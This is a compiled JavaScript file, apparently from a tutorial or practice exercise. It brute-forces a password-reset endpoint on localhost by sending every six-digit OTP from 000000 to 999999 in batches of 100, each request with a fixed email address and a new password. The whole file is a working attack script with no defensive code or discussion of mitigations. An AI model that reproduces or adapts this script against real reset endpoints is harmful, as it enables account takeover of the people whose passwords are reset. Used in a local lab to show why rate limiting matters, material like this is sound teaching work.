"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            yield axios_1.default.post("http://localhost:3000/reset-password", { otp: otp, email: "akshat@gmail.com", newPassword: "randomgig" });
        }
        catch (e) {
            //console.log(e);
        }
    });
}
sendRequest("123456");
//sending request in batches because if we send all thousands of request together our process will ran out of memory
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        //for loop to send request from 0 to 100 to 200, in form of 100 batch
        for (let i = 0; i <= 999999; i += 100) {
            const p = [];
            //here we are sending 100 request at once and waiting it to complete
            for (let j = 0; j < 100; j++) {
                console.log(i);
                p.push(sendRequest((i + j).toString()));
            }
            //here waiting for all 100 request to complete
            yield Promise.all(p);
        }
    });
}
main();
